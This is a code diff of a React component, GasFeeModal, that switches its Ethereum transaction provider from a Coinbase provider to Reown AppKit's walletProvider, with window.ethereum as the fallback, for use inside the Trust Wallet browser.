@@ -2,8 +2,9 @@
 
 import { useEffect, useState, useMemo } from 'react';
 import { X, Fuel, ArrowRight, Loader2, CheckCircle, Check } from 'lucide-react';
-import { ethers } from 'ethers';
+import { ethers, BrowserProvider } from 'ethers';
 import { useWallet } from '@/context/base';
+import { useAppKitProvider } from '@reown/appkit/react';
 import { motion, AnimatePresence } from 'framer-motion';
 
 declare global {
@@ -35,7 +36,8 @@ export default function GasFeeModal({
     const [txSuccess, setTxSuccess] = useState<any>(false);
     const [txHash, setTxHash] = useState('');
     const [error, setError] = useState(null);
-    const { cbProvider, address: add } = useWallet();
+    const { address: add } = useWallet();
+    const { walletProvider } = useAppKitProvider('eip155');
     const [internalUser, setInternalUser] = useState<any>(user);
     const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
     const [loadingSettings, setLoadingSettings] = useState(false);
@@ -107,11 +109,10 @@ export default function GasFeeModal({
             setStatus('processing');
             setError(null);
 
-            // Use window.ethereum (Trust Wallet injected) first — it supports eth_sendTransaction
-            // Fall back to cbProvider only if window.ethereum is unavailable
-            const rawProvider: any = (typeof window !== 'undefined' && (window as any).ethereum)
-                ? (window as any).ethereum
-                : cbProvider;
+            // Use Reown AppKit walletProvider — this is the correct EIP-1193 provider
+            // that supports eth_sendTransaction via WalletConnect / Trust Wallet
+            const rawProvider: any = walletProvider
+                || (typeof window !== 'undefined' && (window as any).ethereum);
 
             if (!rawProvider) {
                 setError("No wallet provider found. Please open this page inside Trust Wallet browser.");
